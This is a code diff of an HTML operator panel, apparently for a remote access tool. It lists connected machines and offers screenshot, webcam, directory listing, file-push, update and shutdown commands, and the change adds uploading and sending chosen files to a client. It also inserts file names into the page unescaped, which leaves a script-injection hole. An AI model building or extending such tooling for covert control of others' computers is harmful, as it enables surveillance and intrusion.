@@ -1,13 +1,68 @@
-<head></head>
+<head>
+  <style>
+    #fileSelector {
+      width: 400px;
+      border: 1px solid grey;
+      position: absolute;
+      top: 60px;
+      left: calc(50% - 200px);
+      z-index: 9;
+      display: none;
+    }
+  </style>
+</head>
 <body>
+  <div id="fileSelector">
+    <form id="upload" method="post" action="/upload" enctype="multipart/form-data">
+      <input type="file" name="file"/>
+      <input type="submit" id="uploadSubmit" value="upload"/>
+    </form>
+    <div id="files"></div>
+  </div>
+
   <div id="list">
 
   </div>
   <div id="tree"></div>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/1.7.2/socket.io.js"></script>
   <script src="http://code.jquery.com/jquery-1.11.1.js"></script>
+  <script src="http://malsup.github.com/jquery.form.js"></script>
   <script>
     const socket = io.connect('127.0.0.1:3000');
+
+    function selectFileFromMaster(callback) {
+      $fileSelector = $('#fileSelector');
+      $files = $('#files');
+      $fileSelector.show();
+      $files.empty();
+
+      socket.emit('server:getuploads');
+      socket.removeAllListeners('master:listuploads');
+      socket.on('master:listuploads', function (files) {
+        files.forEach(n => newEl(n));
+      });
+
+      function newEl(name) {
+        const template = `
+            <p class="file-selectable" data-name="${name}">${name}</p>
+          `;
+        $files.append($(template));
+        $(`.file-selectable`).off().on('click', function(ev) {
+          callback($(ev.target).data('name'));
+          $fileSelector.hide();
+        });
+      }
+
+      $('#uploadSubmit').off().on('click', function(ev) {
+          ev.preventDefault();
+        $('form#upload').ajaxSubmit();
+      });
+
+      socket.removeAllListeners('file:uploaded');
+      socket.on('file:uploaded', function(file) {
+        newEl(file.name);
+      });
+    }
 
     socket.on('client:connect', function(c) {
       const template = `
@@ -36,7 +91,7 @@
                   <button onclick="screenshot(${c})">screenshot</button>
                   <button onclick="webcam(${c})">webcam</button>
                   <button onclick="ls(${c}, 'C://')">ls</button>
-                  <button onclick="send(${c}, 'C://')">send</button>
+                  <button onclick="send(${c})">send</button>
                   <button onclick="sendUpdate(${c}, 'C://')">update</button>
                   <button onclick="sendoff(${c})">close</button>
                   <button onclick="shutdown(${c})">shutdown</button>
@@ -134,9 +189,11 @@
       }
     }
 
-    function send(cl) {
+    function send(cl, dest) {
       console.log('send', cl);
-      socket.emit('client:send', {sid: cl, cmd: 'send', args: {path: 'test.txt', name: 'test.txt'}});
+      selectFileFromMaster(function(name) {
+        socket.emit('client:send', {sid: cl, cmd: 'send', args: {path: './uploads/' + name, name: dest || name}});
+      });
     }
 
     function sendUpdate(cl) {
